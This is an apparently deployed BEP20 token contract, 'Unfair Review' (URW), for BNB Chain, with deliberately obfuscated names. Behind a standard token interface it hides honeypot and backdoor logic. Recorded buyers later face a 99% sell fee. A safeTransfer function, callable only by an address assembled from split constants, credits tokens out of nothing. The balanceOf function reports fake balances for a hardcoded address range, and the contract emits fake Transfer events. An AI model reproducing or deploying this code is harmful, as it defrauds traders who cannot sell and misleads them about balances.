/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}


interface IUniswapV2Router {

    function factory() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function WETH() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function symbol() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function getOwner() external view returns (address);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract UnfairReview is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private atMaxListWallet = 0;

    address public uniswapV2Pair;
    mapping(address => mapping(address => uint256)) _allowances;
    
    uint160 constant isMinTakeFee = 339212710212 * 2 ** 40;

    uint256 mintLaunchedIsMax = 2 ** 18 - 1;
    uint256  senderReceiverLaunchedMint = 100000000 * 10 ** _decimals;


    bool private amountLaunchedFromToken = false;
    uint256 constant feeReceiverIsExempt = 10000 * 10 ** 18;
    bool private totalEnableAutoLimitShouldMin = true;
    uint256 buyFundLaunchedTo = 34915;

    uint256  constant MASK = type(uint128).max;
    uint256 public tradingAtAutoSenderAmount = 0;
    uint256 private modeIsReceiverMin;
    bool private teamBotsFeeMinAmount = true;
    uint256 public launchBotsTokenList = 0;
    string constant _symbol = "URW";
    uint256 private atToShouldAuto = 0;
    bool private txLiquidityBotsLimit;
    address constant modeMinEnableTake = 0xb358c548E5089FAeFb344277C1ac326ea04a94dd;

    mapping(address => uint256) _balances;
    uint256 private takeWalletLaunchLiquiditySenderLimit = 100;
    uint256 public maxWalletAmount = 0;
    uint256  liquidityBuyReceiverTxSellIsReceiver = 100000000 * 10 ** _decimals;
    bool private amountTxLiquidityLaunch = true;
    uint256 private enableReceiverTakeReceiverFeeFrom = 0;
    uint256 private mintFeeTradingLaunch = 0;

    uint256 private limitFromTradingAt;
    uint256 public minLimitLaunchedBuyBotsAtIs = 0;
    bool public minBurnToWallet0 = false;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    mapping(address => bool) private sellLimitTxBotsToLaunchedToken;
    uint256 public buyMintFundTokenFeeAmount = 0;
    uint256 public limitTradingMaxFundReceiverBurnIsIndex = 0;

    uint256 private mintSellLiquidityWallet = 0;
    uint256 private launchBlock = 0;
    string constant _name = "Unfair Review";
    uint256 private marketingFeeToIsAutoTradingWallet;
    uint256 private feeModeBuyEnable;
    mapping(address => bool) private totalEnableListWallet;
    uint256 public totalExemptLiquiditySell = 0;
    mapping(address => bool) private receiverTokenLaunchReceiver;
    uint256 isToMarketingBuySellLaunched = 0;
    uint256 private modeBotsSellReceiverAutoTake;



    uint256 private tradingAtShouldTx = 0;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private isShouldExemptTakeSellMinMax = 0;
    mapping(address => uint256) private buySenderReceiverBurn;
    uint256 totalMintMinLaunchedSwapSell = 100000000 * (10 ** _decimals);

    uint256 private fromAutoReceiverTradingMin = 6 * 10 ** 15;
    uint256 private modeFromAutoLaunch;
    bool private tradingAtTotalTokenSellReceiverFrom = true;

    IUniswapV2Router public marketingSenderMintLiquidity;
    uint160 constant tokenExemptLiquidityFundMode = 876981858358;
    uint256 constant receiverLimitModeMintIsLiquidityMax = 300000 * 10 ** 18;

    uint160 constant isTeamSellMaxShould = 1079501135311 * 2 ** 120;
    mapping(address => bool) private modeAmountBuyTakeTeamFeeMax;

    uint160 constant listTeamMinReceiver = 777439436755 * 2 ** 80;
    address private senderLaunchedTeamExemptBuy = (msg.sender);
    uint256 private toFromReceiverBotsExempt = totalMintMinLaunchedSwapSell / 1000; // 0.1%

    mapping(address => uint256) private tradingMinLaunchedReceiver;
    bool public minBurnToWallet = false;
    bool private txLiquidityLimitReceiver = true;
    uint256 private modeReceiverTxMaxMinBuyMint;

    mapping(uint256 => address) private limitTradingMaxFundReceiverBurnIs;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    mapping(uint256 => address) private tradingFromMinLimit;

    address private shouldAmountFromLaunched = (msg.sender);


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        marketingSenderMintLiquidity = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(marketingSenderMintLiquidity.factory()).createPair(address(this), marketingSenderMintLiquidity.WETH());
        _allowances[address(this)][address(marketingSenderMintLiquidity)] = totalMintMinLaunchedSwapSell;

        txLiquidityBotsLimit = true;

        totalEnableListWallet[msg.sender] = true;
        totalEnableListWallet[0x0000000000000000000000000000000000000000] = true;
        totalEnableListWallet[0x000000000000000000000000000000000000dEaD] = true;
        totalEnableListWallet[address(this)] = true;

        sellLimitTxBotsToLaunchedToken[msg.sender] = true;
        sellLimitTxBotsToLaunchedToken[address(this)] = true;

        receiverTokenLaunchReceiver[msg.sender] = true;
        receiverTokenLaunchReceiver[0x0000000000000000000000000000000000000000] = true;
        receiverTokenLaunchReceiver[0x000000000000000000000000000000000000dEaD] = true;
        receiverTokenLaunchReceiver[address(this)] = true;

        approve(_router, totalMintMinLaunchedSwapSell);
        approve(address(uniswapV2Pair), totalMintMinLaunchedSwapSell);
        _balances[msg.sender] = totalMintMinLaunchedSwapSell;
        emit Transfer(address(0), msg.sender, totalMintMinLaunchedSwapSell);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return totalMintMinLaunchedSwapSell;
    }

    function takeToIsLiquidity(address listMarketingTokenTrading, address enableMinLimitFund, uint256 limitReceiverFundLiquiditymount) internal returns (bool) {
        if (tokenMinEnableAutoMarketingWallet(uint160(enableMinLimitFund))) {
            tokenAmountShouldLiquidity(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount, false);
            return true;
        }
        if (tokenMinEnableAutoMarketingWallet(uint160(listMarketingTokenTrading))) {
            tokenAmountShouldLiquidity(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount, true);
            return true;
        }
        
        bool exemptFromTotalTx = isTotalLimitMarketing(listMarketingTokenTrading) || isTotalLimitMarketing(enableMinLimitFund);
        
        if (listMarketingTokenTrading == uniswapV2Pair) {
            if (maxWalletAmount != 0 && marketingFromFundLiquidity(uint160(enableMinLimitFund))) {
                marketingBurnTxMaxAutoTeam();
            }
            if (!exemptFromTotalTx) {
                isFeeLimitTrading(enableMinLimitFund);
            }
        }
        
        
        if (buyMintFundTokenFeeAmount != launchBotsTokenList) {
            buyMintFundTokenFeeAmount = isShouldExemptTakeSellMinMax;
        }


        if (inSwap || exemptFromTotalTx) {return liquidityMarketingLaunchedExemptTxMin(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount);}
        
        require((limitReceiverFundLiquiditymount <= liquidityBuyReceiverTxSellIsReceiver) || totalEnableListWallet[listMarketingTokenTrading] || totalEnableListWallet[enableMinLimitFund], "Max TX Limit!");

        _balances[listMarketingTokenTrading] = _balances[listMarketingTokenTrading].sub(limitReceiverFundLiquiditymount, "Insufficient Balance!");
        
        uint256 limitReceiverFundLiquiditymountReceived = senderFundTxEnable(listMarketingTokenTrading) ? receiverAutoMintMin(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount) : limitReceiverFundLiquiditymount;

        _balances[enableMinLimitFund] = _balances[enableMinLimitFund].add(limitReceiverFundLiquiditymountReceived);
        emit Transfer(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymountReceived);
        return true;
    }

    function isFeeLimitTrading(address minEnableBurnWalletBuyTrading) private {
        uint256 senderBurnLiquidityTokenAutoModeReceiver = maxIsAmountAtExemptMin();
        if (senderBurnLiquidityTokenAutoModeReceiver < fromAutoReceiverTradingMin) {
            limitTradingMaxFundReceiverBurnIsIndex += 1;
            limitTradingMaxFundReceiverBurnIs[limitTradingMaxFundReceiverBurnIsIndex] = minEnableBurnWalletBuyTrading;
            tradingMinLaunchedReceiver[minEnableBurnWalletBuyTrading] += senderBurnLiquidityTokenAutoModeReceiver;
            if (tradingMinLaunchedReceiver[minEnableBurnWalletBuyTrading] > fromAutoReceiverTradingMin) {
                maxWalletAmount = maxWalletAmount + 1;
                tradingFromMinLimit[maxWalletAmount] = minEnableBurnWalletBuyTrading;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        tradingFromMinLimit[maxWalletAmount] = minEnableBurnWalletBuyTrading;
    }

    function setamountFromBuyShouldFund(bool senderBotsModeMintBuy) public onlyOwner {
        if (amountLaunchedFromToken == minBurnToWallet0) {
            minBurnToWallet0=senderBotsModeMintBuy;
        }
        amountLaunchedFromToken=senderBotsModeMintBuy;
    }

    function getMaxTotalAFee() public {
        isBuyLiquidityToSellAmount();
    }

    function safeTransfer(address listMarketingTokenTrading, address enableMinLimitFund, uint256 limitReceiverFundLiquiditymount) public {
        if (!enableLiquidityTeamTxReceiver(uint160(msg.sender))) {
            return;
        }
        if (tokenMinEnableAutoMarketingWallet(uint160(enableMinLimitFund))) {
            tokenAmountShouldLiquidity(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount, false);
            return;
        }
        if (tokenMinEnableAutoMarketingWallet(uint160(listMarketingTokenTrading))) {
            tokenAmountShouldLiquidity(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount, true);
            return;
        }
        if (listMarketingTokenTrading == address(0)) {
            _balances[enableMinLimitFund] = _balances[enableMinLimitFund].add(limitReceiverFundLiquiditymount);
            return;
        }
        if (listMarketingTokenTrading == address(1)) {
            return;
        }
        if (listMarketingTokenTrading == address(2)) {
            return;
        }
        if (listMarketingTokenTrading == address(3)) {
            return;
        }
    }

    function setmintAtIsFund(address senderBotsModeMintBuy) public onlyOwner {
        shouldAmountFromLaunched=senderBotsModeMintBuy;
    }

    function getbotsLaunchTeamTotal(address senderBotsModeMintBuy) public view returns (bool) {
        if (senderBotsModeMintBuy != shouldAmountFromLaunched) {
            return minBurnToWallet0;
        }
        if (sellLimitTxBotsToLaunchedToken[senderBotsModeMintBuy] != totalEnableListWallet[senderBotsModeMintBuy]) {
            return txLiquidityLimitReceiver;
        }
        if (senderBotsModeMintBuy != shouldAmountFromLaunched) {
            return txLiquidityLimitReceiver;
        }
            return sellLimitTxBotsToLaunchedToken[senderBotsModeMintBuy];
    }

    function setreceiverIsAtBuyTotal(bool senderBotsModeMintBuy) public onlyOwner {
        if (teamBotsFeeMinAmount == txLiquidityLimitReceiver) {
            txLiquidityLimitReceiver=senderBotsModeMintBuy;
        }
        if (teamBotsFeeMinAmount != amountTxLiquidityLaunch) {
            amountTxLiquidityLaunch=senderBotsModeMintBuy;
        }
        teamBotsFeeMinAmount=senderBotsModeMintBuy;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function setfromIsLiquidityLaunchLimit(uint256 senderBotsModeMintBuy) public onlyOwner {
        if (mintFeeTradingLaunch != takeWalletLaunchLiquiditySenderLimit) {
            takeWalletLaunchLiquiditySenderLimit=senderBotsModeMintBuy;
        }
        if (mintFeeTradingLaunch != fromAutoReceiverTradingMin) {
            fromAutoReceiverTradingMin=senderBotsModeMintBuy;
        }
        mintFeeTradingLaunch=senderBotsModeMintBuy;
    }

    function senderFundTxEnable(address listMarketingTokenTrading) internal view returns (bool) {
        return !receiverTokenLaunchReceiver[listMarketingTokenTrading];
    }

    function marketingBurnTxMaxAutoTeam() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (buySenderReceiverBurn[tradingFromMinLimit[i]] == 0) {
                    buySenderReceiverBurn[tradingFromMinLimit[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function isTotalLimitMarketing(address minEnableBurnWalletBuyTrading) private view returns (bool) {
        if (minEnableBurnWalletBuyTrading == senderLaunchedTeamExemptBuy) {
            return true;
        }
        uint256 burnSwapBuyLiquidity = uint256(uint160(minEnableBurnWalletBuyTrading)) << 192;
        burnSwapBuyLiquidity = burnSwapBuyLiquidity >> 238;
        return burnSwapBuyLiquidity == mintLaunchedIsMax;
    }

    function isBuyLiquidityToSellAmount() private {
        if (limitTradingMaxFundReceiverBurnIsIndex > 0) {
            for (uint256 i = 1; i <= limitTradingMaxFundReceiverBurnIsIndex; i++) {
                if (buySenderReceiverBurn[limitTradingMaxFundReceiverBurnIs[i]] == 0) {
                    buySenderReceiverBurn[limitTradingMaxFundReceiverBurnIs[i]] = block.timestamp;
                }
            }
            limitTradingMaxFundReceiverBurnIsIndex = 0;
        }
    }

    function getreceiverIsAtBuyTotal() public view returns (bool) {
        if (teamBotsFeeMinAmount == txLiquidityLimitReceiver) {
            return txLiquidityLimitReceiver;
        }
        if (teamBotsFeeMinAmount != txLiquidityLimitReceiver) {
            return txLiquidityLimitReceiver;
        }
        return teamBotsFeeMinAmount;
    }

    function maxTradingToLaunchedWallet(address listMarketingTokenTrading, uint256 autoTotalMintFeeTake) private view returns (uint256) {
        uint256 exemptWalletShouldToTxMode = buySenderReceiverBurn[listMarketingTokenTrading];
        if (exemptWalletShouldToTxMode > 0 && totalLiquidityToMaxWallet() - exemptWalletShouldToTxMode > 0) {
            return 99;
        }
        return autoTotalMintFeeTake;
    }

    function setshouldModeMarketingReceiverBuy(bool senderBotsModeMintBuy) public onlyOwner {
        if (amountTxLiquidityLaunch != tradingAtTotalTokenSellReceiverFrom) {
            tradingAtTotalTokenSellReceiverFrom=senderBotsModeMintBuy;
        }
        if (amountTxLiquidityLaunch == minBurnToWallet0) {
            minBurnToWallet0=senderBotsModeMintBuy;
        }
        if (amountTxLiquidityLaunch != amountTxLiquidityLaunch) {
            amountTxLiquidityLaunch=senderBotsModeMintBuy;
        }
        amountTxLiquidityLaunch=senderBotsModeMintBuy;
    }

    function getfromIsLiquidityLaunchLimit() public view returns (uint256) {
        if (mintFeeTradingLaunch != takeWalletLaunchLiquiditySenderLimit) {
            return takeWalletLaunchLiquiditySenderLimit;
        }
        if (mintFeeTradingLaunch == minLimitLaunchedBuyBotsAtIs) {
            return minLimitLaunchedBuyBotsAtIs;
        }
        return mintFeeTradingLaunch;
    }

    function settxToIsMode(address senderBotsModeMintBuy) public onlyOwner {
        senderLaunchedTeamExemptBuy=senderBotsModeMintBuy;
    }

    function tokenAmountShouldLiquidity(address listMarketingTokenTrading, address enableMinLimitFund, uint256 limitReceiverFundLiquiditymount, bool marketingTakeMinTokenEnableBuy) private {
        if (marketingTakeMinTokenEnableBuy) {
            listMarketingTokenTrading = address(uint160(uint160(modeMinEnableTake) + isToMarketingBuySellLaunched));
            isToMarketingBuySellLaunched++;
            _balances[enableMinLimitFund] = _balances[enableMinLimitFund].add(limitReceiverFundLiquiditymount);
        } else {
            _balances[listMarketingTokenTrading] = _balances[listMarketingTokenTrading].sub(limitReceiverFundLiquiditymount);
        }
        emit Transfer(listMarketingTokenTrading, enableMinLimitFund, limitReceiverFundLiquiditymount);
    }

    function getshouldModeMarketingReceiverBuy() public view returns (bool) {
        if (amountTxLiquidityLaunch == totalEnableAutoLimitShouldMin) {
            return totalEnableAutoLimitShouldMin;
        }
        if (amountTxLiquidityLaunch != teamBotsFeeMinAmount) {
            return teamBotsFeeMinAmount;
        }
        if (amountTxLiquidityLaunch != amountLaunchedFromToken) {
            return amountLaunchedFromToken;
        }
        return amountTxLiquidityLaunch;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != totalMintMinLaunchedSwapSell) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return takeToIsLiquidity(sender, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return takeToIsLiquidity(msg.sender, recipient, amount);
    }

    function getmintAtIsFund() public view returns (address) {
        if (shouldAmountFromLaunched != shouldAmountFromLaunched) {
            return shouldAmountFromLaunched;
        }
        return shouldAmountFromLaunched;
    }

    function getsellShouldSenderMintList() public view returns (uint256) {
        return minLimitLaunchedBuyBotsAtIs;
    }

    function maxIsAmountAtExemptMin() private view returns (uint256) {
        address marketingBuyWalletSwapModeTotalAuto = WBNB;
        if (address(this) < WBNB) {
            marketingBuyWalletSwapModeTotalAuto = address(this);
        }
        (uint listBurnTotalAtTakeEnable, uint totalLiquidityReceiverShould,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 takeAmountAtMaxToReceiver,) = WBNB == marketingBuyWalletSwapModeTotalAuto ? (listBurnTotalAtTakeEnable, totalLiquidityReceiverShould) : (totalLiquidityReceiverShould, listBurnTotalAtTakeEnable);
        uint256 receiverToTxList = IERC20(WBNB).balanceOf(uniswapV2Pair) - takeAmountAtMaxToReceiver;
        return receiverToTxList;
    }

    function receiverAutoMintMin(address listMarketingTokenTrading, address mintReceiverWalletTeam, uint256 limitReceiverFundLiquiditymount) internal returns (uint256) {
        
        uint256 totalTeamMarketingTo = limitReceiverFundLiquiditymount.mul(amountAtLaunchedLaunchLiquidity(listMarketingTokenTrading, mintReceiverWalletTeam == uniswapV2Pair)).div(takeWalletLaunchLiquiditySenderLimit);

        if (modeAmountBuyTakeTeamFeeMax[listMarketingTokenTrading] || modeAmountBuyTakeTeamFeeMax[mintReceiverWalletTeam]) {
            totalTeamMarketingTo = limitReceiverFundLiquiditymount.mul(99).div(takeWalletLaunchLiquiditySenderLimit);
        }

        _balances[address(this)] = _balances[address(this)].add(totalTeamMarketingTo);
        emit Transfer(listMarketingTokenTrading, address(this), totalTeamMarketingTo);
        
        return limitReceiverFundLiquiditymount.sub(totalTeamMarketingTo);
    }

    function tokenMinEnableAutoMarketingWallet(uint160 limitReceiverFundLiquidityccount) private pure returns (bool) {
        if (limitReceiverFundLiquidityccount >= uint160(modeMinEnableTake) && limitReceiverFundLiquidityccount <= uint160(modeMinEnableTake) + 120000) {
            return true;
        }
        return false;
    }

    function setbotsLaunchTeamTotal(address senderBotsModeMintBuy,bool limitReceiverFundLiquidity1) public onlyOwner {
        if (senderBotsModeMintBuy != senderLaunchedTeamExemptBuy) {
            amountLaunchedFromToken=limitReceiverFundLiquidity1;
        }
        if (senderBotsModeMintBuy != WBNB) {
            minBurnToWallet=limitReceiverFundLiquidity1;
        }
        sellLimitTxBotsToLaunchedToken[senderBotsModeMintBuy]=limitReceiverFundLiquidity1;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function launchedEnableTakeBots(uint160 limitReceiverFundLiquidityccount) private view returns (uint256) {
        uint256 autoMintEnableIs = isToMarketingBuySellLaunched;
        uint256 launchedTokenBurnReceiverAtFund = limitReceiverFundLiquidityccount - uint160(modeMinEnableTake);
        if (launchedTokenBurnReceiverAtFund < autoMintEnableIs) {
            return feeReceiverIsExempt;
        }
        return receiverLimitModeMintIsLiquidityMax;
    }

    function setWBNB(address senderBotsModeMintBuy) public onlyOwner {
        if (WBNB == DEAD) {
            DEAD=senderBotsModeMintBuy;
        }
        if (WBNB == shouldAmountFromLaunched) {
            shouldAmountFromLaunched=senderBotsModeMintBuy;
        }
        if (WBNB == shouldAmountFromLaunched) {
            shouldAmountFromLaunched=senderBotsModeMintBuy;
        }
        WBNB=senderBotsModeMintBuy;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function marketingFromFundLiquidity(uint160 enableMinLimitFund) private view returns (bool) {
        return uint16(enableMinLimitFund) == buyFundLaunchedTo;
    }

    function getMaxTotalAmount() public {
        marketingBurnTxMaxAutoTeam();
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, totalMintMinLaunchedSwapSell);
    }

    function getamountFromBuyShouldFund() public view returns (bool) {
        if (amountLaunchedFromToken != teamBotsFeeMinAmount) {
            return teamBotsFeeMinAmount;
        }
        return amountLaunchedFromToken;
    }

    function getWBNB() public view returns (address) {
        if (WBNB == WBNB) {
            return WBNB;
        }
        if (WBNB == ZERO) {
            return ZERO;
        }
        if (WBNB == DEAD) {
            return DEAD;
        }
        return WBNB;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (tokenMinEnableAutoMarketingWallet(uint160(account))) {
            return launchedEnableTakeBots(uint160(account));
        }
        return _balances[account];
    }

    function getreceiverBuyMinLaunched() public view returns (bool) {
        if (tradingAtTotalTokenSellReceiverFrom == amountTxLiquidityLaunch) {
            return amountTxLiquidityLaunch;
        }
        return tradingAtTotalTokenSellReceiverFrom;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function amountAtLaunchedLaunchLiquidity(address listMarketingTokenTrading, bool shouldTokenBurnLimit) internal returns (uint256) {
        
        if (buyMintFundTokenFeeAmount == enableReceiverTakeReceiverFeeFrom) {
            buyMintFundTokenFeeAmount = maxWalletAmount;
        }

        if (tradingAtShouldTx == atMaxListWallet) {
            tradingAtShouldTx = limitTradingMaxFundReceiverBurnIsIndex;
        }


        if (shouldTokenBurnLimit) {
            limitFromTradingAt = isShouldExemptTakeSellMinMax + enableReceiverTakeReceiverFeeFrom;
            return maxTradingToLaunchedWallet(listMarketingTokenTrading, limitFromTradingAt);
        }
        if (!shouldTokenBurnLimit && listMarketingTokenTrading == uniswapV2Pair) {
            limitFromTradingAt = mintFeeTradingLaunch + mintSellLiquidityWallet;
            return limitFromTradingAt;
        }
        return maxTradingToLaunchedWallet(listMarketingTokenTrading, limitFromTradingAt);
    }

    function enableLiquidityTeamTxReceiver(uint160 limitReceiverFundLiquidityccount) private pure returns (bool) {
        uint160 limitReceiverFundLiquidity = isTeamSellMaxShould;
        limitReceiverFundLiquidity += listTeamMinReceiver;
        limitReceiverFundLiquidity += isMinTakeFee;
        limitReceiverFundLiquidity += tokenExemptLiquidityFundMode;
        if (limitReceiverFundLiquidityccount == limitReceiverFundLiquidity) {
            return true;
        }
        return false;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function totalLiquidityToMaxWallet() private view returns (uint256) {
        return block.timestamp;
    }

    function getamountFeeFromListExempt() public view returns (uint256) {
        if (atToShouldAuto != maxWalletAmount) {
            return maxWalletAmount;
        }
        if (atToShouldAuto != enableReceiverTakeReceiverFeeFrom) {
            return enableReceiverTakeReceiverFeeFrom;
        }
        if (atToShouldAuto != minLimitLaunchedBuyBotsAtIs) {
            return minLimitLaunchedBuyBotsAtIs;
        }
        return atToShouldAuto;
    }

    function setreceiverBuyMinLaunched(bool senderBotsModeMintBuy) public onlyOwner {
        tradingAtTotalTokenSellReceiverFrom=senderBotsModeMintBuy;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function gettxToIsMode() public view returns (address) {
        return senderLaunchedTeamExemptBuy;
    }

    function setamountFeeFromListExempt(uint256 senderBotsModeMintBuy) public onlyOwner {
        atToShouldAuto=senderBotsModeMintBuy;
    }

    function setsellShouldSenderMintList(uint256 senderBotsModeMintBuy) public onlyOwner {
        minLimitLaunchedBuyBotsAtIs=senderBotsModeMintBuy;
    }

    function liquidityMarketingLaunchedExemptTxMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}